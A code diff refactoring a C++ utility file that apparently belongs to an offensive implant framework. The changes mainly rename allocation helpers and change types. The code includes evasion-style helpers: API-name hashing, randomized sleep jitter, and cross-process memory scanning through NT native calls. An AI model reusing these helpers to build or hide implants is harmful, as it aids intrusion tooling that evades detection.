@@ -1,21 +1,21 @@
-#include <include/utils.hpp>
+#include <core/include/utils.hpp>
 namespace Utils {
 
     VOID AppendBuffer(uint8_t **buffer, const uint8_t *const target, uint32_t *capacity, const uint32_t length) {
 
-        const auto new_buffer = B_PTR(x_realloc(*buffer, *capacity + length));
+        const auto new_buffer = B_PTR(Realloc(*buffer, *capacity + length));
         if (!new_buffer) {
             return;
         }
 
         *buffer = new_buffer;
-        x_memcpy(B_PTR(*buffer) + *capacity, (void*) target, length);
+        MemCopy(B_PTR(*buffer) + *capacity, (void*) target, length);
         *capacity += length;
     }
 
     VOID AppendPointerList(void **array[], void *pointer, uint32_t *count) {
 
-        const auto new_list = (void**) x_realloc(*array, (*count + 1) * sizeof(void*));
+        const auto new_list = (void**) Realloc(*array, (*count + 1) * sizeof(void*));
         if (!new_list) {
             return;
         }
@@ -25,7 +25,7 @@ namespace Utils {
         (*count)++;
     }
 
-    ULONG HashStringA(char const *string, size_t length) {
+    UINT32 HashStringA(char const *string, size_t length) {
 
         auto hash = FNV_OFFSET;
         if (string) {
@@ -37,7 +37,7 @@ namespace Utils {
         return hash;
     }
 
-    ULONG HashStringW(wchar_t const *string, size_t length) {
+    UINT32 HashStringW(wchar_t const *string, size_t length) {
 
         auto hash = FNV_OFFSET;
         if (string) {
@@ -105,7 +105,7 @@ namespace Utils {
             size_t read         = 0;
             uintptr_t address   = 0;
 
-            auto buffer = (uint8_t*) x_malloc(size);
+            auto buffer = (uint8_t*) Malloc(size);
             x_ntassert(Ctx->nt.NtReadVirtualMemory(process, (void*) start, buffer, size, &read));
 
             for (auto i = 0; i < size; i++) {
@@ -115,10 +115,10 @@ namespace Utils {
                 }
             }
 
-            x_memset(buffer, 0, size);
+            MemSet(buffer, 0, size);
 
         defer:
-            if (buffer) { x_free(buffer); }
+            if (buffer) { Free(buffer); }
             return address;
         }
 
@@ -186,7 +186,7 @@ namespace Utils {
 
     namespace Random {
 
-		ULONG RandomSleepTime() {
+		UINT32 RandomSleepTime() {
 
 			SYSTEMTIME sys_time = { };
 
@@ -235,7 +235,7 @@ namespace Utils {
 			return sleeptime;
 		}
 
-        ULONG RandomSeed() {
+        UINT32 RandomSeed() {
 
             return 'A2' * -40271 +
                    __TIME__[7] * 1 +
@@ -258,12 +258,12 @@ namespace Utils {
             return (time.QuadPart - epoch) / ms_ticks;
         }
 
-        ULONG RandomNumber32() {
+        UINT32 RandomNumber32() {
 
             auto seed = RandomSeed();
 
-            seed = Ctx->nt.RtlRandomEx(&seed);
-            seed = Ctx->nt.RtlRandomEx(&seed);
+            seed = Ctx->nt.RtlRandomEx((PULONG) &seed);
+            seed = Ctx->nt.RtlRandomEx((PULONG) &seed);
             seed = seed % (LONG_MAX - 2 + 1) + 2;
 
             return seed % 2 == 0
@@ -276,7 +276,7 @@ namespace Utils {
             auto seed = RandomSeed();
 
             seed = RandomSeed();
-            seed = Ctx->nt.RtlRandomEx(&seed);
+            seed = Ctx->nt.RtlRandomEx((PULONG) &seed);
 
             return seed % 2 == 0 ? TRUE : FALSE;
         }
